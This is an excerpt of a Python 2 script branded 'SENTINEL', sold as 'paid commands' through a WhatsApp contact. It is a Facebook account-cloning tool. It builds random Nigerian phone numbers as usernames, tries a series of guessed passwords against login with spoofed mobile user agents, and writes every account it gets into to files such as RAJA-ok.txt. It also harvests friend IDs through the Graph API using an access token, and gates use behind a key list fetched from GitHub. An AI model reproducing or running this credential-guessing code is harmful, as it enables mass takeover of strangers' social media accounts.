...
logo = "'\x1b[1;92m' \n ▄▀▀ █▀▀ █▄░█ ▀█▀ ▀ █▄░█ █▀▀ █░░ █▀▄ █▀▀▄ ▀ █▄░▄█ █▀▀
 ░▀▄ █▀▀ █░▀█ ░█░ █ █░▀█ █▀▀ █░▄ █░█ █▐█▀ █ █░█░█ █▀▀
 ▀▀░ ▀▀▀ ▀░░▀ ░▀░ ▀ ▀░░▀ ▀▀▀ ▀▀▀ █▀░ ▀░▀▀ ▀ ▀░░░▀ ▀▀▀ \n\n\n'\x1b[1;91m'   Author      :     SENTINEL   \n'\x1b[1;92m'   Github      :     SENTINEL101 \n'\x1b[1;92m'   KING OF     :     SENTINEL\n'\x1b[1;91m'   TOOL TYPE   :     PAID COMMANDS\n'\x1b[1;92m'   WHATSAPP NUMBER  :     09071122714           \n"
dec = '2'
server = '2'
...
def main_apv():
    ...
    try:
        ...
        os.system('clear')
        print logo
        print '           You dont have subscription'
        print '           Hello Dear This Command Is Paid Or'
        print '           Please Subscribe Ap'
        print '           Admin SENTINEL Thanks'
        print '           Subscription  Enter Press Kro'
        print '           Or Whatsapp SENTINEL Thanks'
        print ''
        ...
        print ''
        print '           FOR KEY'
        print '           Copy SENTINEL WhatsApp '
        print ''
        print ''
        print "
        raw_input('    Termux Sa Exit Kar Ka Phir Sa Cammonds Lagio ')
        os.system('xdg-open https://wa.me/+2349071122714')

    r1 = requests.get('https://raw.githubusercontent.com/SENTINEL101/SUPREME/main/bot.txt').text
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
...
def main_system():
    ...
    try:
        ...
        print '\x1b[1;91mToken on Checkpoint '
        os.system('rm -rf token.txt')
...
def main_input():
    ...
    if mx == '1':
        ...
        print '\x1b[1;92m        Member In SENTINEL Paid Commands '
        print '\x1b[1;91m        ENJOY  BOI '
        time.sleep(3.5)
        main_system()
    elif mx == '6':
        ...
        time.sleep(5)
        xox('\x1b[92;1m\n SENTINEL TOOL UPDATE SUCCESSFUL :)\n')
        time.sleep(2)
        main_system()
    elif mx == '7':
        os.system('xdg-open https://wa.me/+2349071122714')
...
def numcloning():
    ...
    print logo
    print ''
    print '    \x1b[1;91m\n[ Nigeria Random Number Cloning ]'
    print ''
    print '\x1b[1;92m\n   [*] Enter First 4 Latter Of Any Network : '
    print '\x1b[1;93m\n     Example 0901 0900 0912 0902 0913  '
    print ''
    ...
    def main(arg):
        ...
        lines = random.choice([
         ...
         'Operamini/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'])
        try:
            pass1 = user
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[SENTINEL-OK] ' + coc + user + ' | ' + pass1
                ok = open('random-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[SENTINEL-CP] ' + coc + user + ' | ' + pass1
...
def mineExt():
    ...
    print g + '[=] Extracting From Sentinel : ' + my_line[:15]
    ...
    my_line = file.readline()
    count.append(my_line)
    print g + '[=] Extracting From Semtinel : ' + my_line[:15]
    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
    z = json.loads(r.text)
    fuck = open('jok.txt', 'a')
    for i in z['data']:
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[SENTINEL-OK] ' + uid + ' | ' + pass1
                ok = open('RAJA-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[SENTINEL-CP] ' + uid + ' | ' + pass1
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[SENTINEL-OK] ' + uid + ' | ' + pass2
                    ok = open('RAJA-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[SENTINEL-CP] ' + uid + ' | ' + pass2
                    cp = open('RAJA-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[SENTINEL-OK] ' + uid + ' | ' + pass3
                        ok = open('RAJA-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[SENTINEL-CP] ' + uid + ' | ' + pass3
                        cp = open('RAJA-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[SENTINEL-OK] ' + uid + ' | ' + pass4
                            ok = open('RAJA-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[SENTINEL-CP] ' + uid + ' | ' + pass4
                            cp = open('RAJA-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[SENTINEL-OK] ' + uid + ' | ' + pass5
                                ok = open('RAJA-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[SENTINEL-CP] ' + uid + ' | ' + pass5
                                cp = open('RAJA-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[SENTINEL-OK] ' + uid + ' | ' + pass6
                                    ok = open('Raja-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;91m[SENTINEL-CP] ' + uid + ' | ' + pass6
                                    cp = open('Raja-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
